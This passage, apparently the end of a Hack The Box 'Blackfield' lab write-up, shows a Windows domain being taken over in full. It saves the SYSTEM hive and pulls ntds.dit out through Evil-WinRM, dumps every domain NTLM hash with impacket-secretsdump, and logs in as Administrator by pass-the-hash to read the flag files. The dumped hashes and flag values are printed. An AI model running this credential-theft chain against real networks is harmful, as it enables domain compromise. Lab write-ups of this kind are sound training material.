   Ended : Sunday, February 26, 2023 8:52:11 PM

*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save hklm\system .\system
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Documents> dir


    Directory: C:\Users\svc_backup\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/26/2023   8:16 PM            191 backupscript.txt
-a----        2/26/2023   8:43 PM       18874368 ntds.dit
-a----        2/26/2023   8:52 PM       17580032 system


*Evil-WinRM* PS C:\Users\svc_backup\Documents> download ntds.dit
Info: Downloading ntds.dit to ./ntds.dit

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\svc_backup\Documents> download system
Info: Downloading system to ./system

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\svc_backup\Documents> exit

Info: Exiting with code 0
```

Now that we have downloaded the necessary files (system and ntds.dit) to our attacking machine we can utilize (impacket)[https://github.com/fortra/impacket] to decode the user accounts and reveal their password hashes.

```shell
┌──(thadigus㉿kali)-[~/HTB/Blackfield/privesc]
└─$ impacket-secretsdump -system ./system -ntds ./ntds.dit LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ./ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:2502dc899b69e2ec509bd7fbe6f76fd5:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
### SNIP ###
[*] Cleaning up... 
```

Once again, now that we have the password hashes for all users on the box we can login as them. We choose the Administrator password hash from the list and use Evil-WinRM to perform a Pass-The-Hash attack on the machine, providing us with an Administrator shell on the machine.

```shell
┌──(thadigus㉿kali)-[~/HTB/Blackfield/privesc]
└─$ evil-winrm -i 10.10.10.192 -u Administrator -H '184fb5e5178480be64824d4cd53b99ee'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
blackfield\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-a----        11/5/2020   8:38 PM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4375a629c7c67c8e29db269060c955cb
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cd C:\Users\svc_backup\Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
3920bb317a0bef51027e2852be64b543
```
